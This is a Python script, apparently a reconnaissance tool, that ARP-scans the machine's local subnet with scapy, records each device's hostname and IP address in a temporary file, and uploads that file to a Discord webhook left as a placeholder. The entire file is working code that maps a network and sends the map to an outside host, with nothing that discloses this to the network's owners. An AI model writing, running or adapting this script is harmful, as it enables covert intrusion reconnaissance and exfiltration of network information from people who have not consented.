import os
import socket
import netifaces
import scapy.all as scapy
import tempfile
import sys
import requests

WEBHOOK_URL = "YOUR DISCORD WEBHOOK HERE"


def get_current_subnet():
    # Get the default network interface to determine the current subnet
    default_interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    interfaces = netifaces.interfaces()

    # Get the IP and netmask of the default interface
    if default_interface in interfaces:
        addrs = netifaces.ifaddresses(default_interface)
        ip_info = addrs[netifaces.AF_INET][0]
        ip_address = ip_info['addr']
        netmask = ip_info['netmask']
        return ip_address, netmask
    else:
        return None


def map_subnet_devices(ip_address, netmask):
    subnet_devices = []
    subnet_range = '.'.join([str(int(ip_address.split('.')[i]) & int(netmask.split('.')[i])) for i in range(4)])
    subnet_cidr = subnet_range + '/' + str(sum(bin(int(x)).count('1') for x in netmask.split('.')))

    # Use ARP requests to get device information within the subnet
    ans, _ = scapy.arping(subnet_cidr, timeout=2, verbose=False)
    for _, rcv in ans.res:
        device_name = socket.getfqdn(rcv.psrc)
        subnet_devices.append((device_name, rcv.psrc))

    return subnet_devices


def upload_to_discord(webhook_url, file_path):
    with open(file_path, 'rb') as file:
        payload = {"file": (file_path, file)}
        response = requests.post(webhook_url, files=payload)
        if response.status_code == 200:
            print("File uploaded successfully to Discord.")
        else:
            print(f"Failed to upload the file to Discord. Status code: {response.status_code}")


def main():
    # Get the current subnet
    subnet_info = get_current_subnet()

    if subnet_info:
        ip_address, netmask = subnet_info

        # Create a temporary file to store the output
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, "subnet_devices.txt")

        with open(output_file, 'w') as f:
            sys.stdout = f  # Redirect stdout to the file

            print(f"Current Subnet: {ip_address}/{netmask}")

            # Map devices on the current subnet
            subnet_devices = map_subnet_devices(ip_address, netmask)
            print("\nDevices on the Subnet:")
            for device_name, device_ip in subnet_devices:
                print(f"Device Name: {device_name}, IP Address: {device_ip}")

        sys.stdout = sys.__stdout__

        print(f"Output written to: {output_file}")

        # Upload the file to Discord
        upload_to_discord(WEBHOOK_URL, output_file)
    else:
        print("Unable to retrieve subnet information.")


if __name__ == "__main__":
    main()
